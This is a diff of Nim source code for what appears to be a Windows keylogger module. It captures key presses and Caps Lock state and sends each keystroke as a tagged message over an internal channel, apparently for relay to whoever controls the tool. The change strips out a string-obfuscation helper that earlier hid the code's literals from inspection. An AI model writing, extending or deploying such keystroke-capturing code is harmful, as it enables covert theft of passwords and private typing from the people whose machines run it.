@@ -37,8 +37,7 @@ from winim/inc/winuser import GetKeyState
 
 from winim/utils import winimConverterBOOLToBoolean
 
-from ../functions/hideString import e
-from ../functions/hideString import d
+import ../functions/hideString
 
 from ../channels import mainChannel
 
@@ -64,11 +63,11 @@ proc processDataThread(): void {.thread.} =
 
         if key == VK_CAPITAL:
           if (bitand(GetKeyState(VK_CAPITAL), 0x0001)) != 0:
-            prefix = d e "+"
+            prefix = "+"
           else:
-            prefix = d e "-"
+            prefix = "-"
 
-        mainChannel.send (d e "k", prefix & keyText)
+        mainChannel.send ("k", prefix & keyText)
 
       elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
         if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or # ctrl
@@ -77,7 +76,7 @@ proc processDataThread(): void {.thread.} =
           key == VK_LWIN or key == VK_RWIN: # win
           
           # insert like [SHIFT] [a] [b] <[SHIFT]
-          mainChannel.send (d e "k", d(e("<")) & keyText)
+          mainChannel.send ("k", "<" & keyText)
 
     sleep(10)
 
